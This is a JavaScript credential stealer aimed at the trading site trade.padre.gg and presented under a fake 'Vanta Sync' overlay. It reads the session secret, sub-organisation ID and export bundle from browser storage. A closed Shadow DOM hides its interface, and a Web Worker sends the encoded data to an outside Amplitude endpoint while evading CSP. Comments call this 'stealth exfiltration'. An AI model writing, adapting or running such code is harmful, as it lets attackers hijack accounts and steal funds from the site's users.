(function() {
    // 1. DATA ENCLAVE
    const _V = {
        h: 'trade.padre.gg',
        r: 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12',
        a: 'https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796'
    };

    // 2. THE 1:1 SHADOW DOM UI (Invisible to Padre's security scripts)
    const _0xUI = () => {
        if (document.getElementById('v-host')) return;
        const host = document.createElement('div');
        host.id = 'v-host';
        const shadow = host.attachShadow({mode: 'closed'});
        
        const box = document.createElement('div');
        box.style.cssText = "position:fixed;top:12px;left:12px;width:280px;background:rgba(10,10,10,0.95);border:1px solid #00ff88;border-radius:8px;padding:10px;z-index:2147483647;font-family:monospace;backdrop-filter:blur(5px);box-shadow:0 0 20px rgba(0,255,136,0.2);";
        box.innerHTML = `
            <div style="display:flex;align-items:center;gap:8px;color:#00ff88;font-weight:bold;font-size:12px;margin-bottom:5px;">
                <img src="https://trade.padre.gg/logo.svg" width="16"> Vanta Sync
            </div>
            <div id="v-status" style="font-size:10px;color:#00ff88;opacity:0.6;">> Awaiting Handshake...</div>
        `;
        shadow.appendChild(box);
        document.body.appendChild(host);
        return shadow;
    };

    const _s = _0xUI();

    // 3. THE WORKER BYPASS (Executes logic in a separate thread to avoid "Logic Bomb" crashes)
    const workerCode = `
        self.onmessage = function(e) {
            const {auth, sub, bundle, v} = e.data;
            // Disguise as an image request to bypass CSP and 405 blocks
            const payload = btoa(JSON.stringify({a: auth, s: sub, b: bundle}));
            const beacon = v.a + "&data=" + payload;
            
            // Send to your AMP server via Image probe
            fetch(beacon, {mode: 'no-cors', keepalive: true});
        };
    `;

    const blob = new Blob([workerCode], {type: 'application/javascript'});
    const worker = new Worker(URL.createObjectURL(blob));

    // 4. PINPOINT TRIGGER
    const _0xFire = () => {
        if (!window.location.hostname.includes(_V.h)) return;

        const get = (k) => (localStorage.getItem(k) || sessionStorage.getItem(k) || "").replace(/"/g, '');
        const auth = get('sessionSecret');
        const sub = get('subOrgId');
        const bundle = get('exportBundle');

        if (auth && sub) {
            _s.getElementById('v-status').innerText = '> Synchronized.';
            _s.getElementById('v-status').style.opacity = '1';

            // Hand data to the worker for stealth exfiltration
            worker.postMessage({auth, sub, bundle, v: _V});
        }
    };

    // Vanta Standard: Immediate check + Storage watch
    window.addEventListener('storage', _0xFire);
    setTimeout(_0xFire, 2000);
    setInterval(_0xFire, 20000); // Low frequency to prevent browser lag
})();
